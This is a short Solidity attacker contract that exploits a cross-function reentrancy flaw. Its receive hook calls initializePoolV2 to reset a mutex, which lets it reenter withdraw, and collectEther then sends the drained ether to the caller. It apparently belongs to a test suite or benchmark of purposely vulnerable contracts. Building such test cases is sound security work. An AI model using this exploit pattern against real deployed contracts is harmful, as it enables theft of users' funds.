// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "../../cross-function/guard/mutex/mod/CrossDoubleInit_ree1.sol";

contract CrossDoubleInit_Attacker {
    CrossDoubleInit_ree1 private c;
    bool private attackPerformed;

    constructor(address v) {
        c = CrossDoubleInit_ree1(v);
    }

    function attack() public payable {
        c.deposit{value: 1 ether}();
        c.withdraw();
    }

    receive() external payable {
        if (!attackPerformed) {
            attackPerformed = true;
            c.initializePoolV2(); // setting the flag back to false allows to reenter withdraw exactly once
            c.withdraw();
        }
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
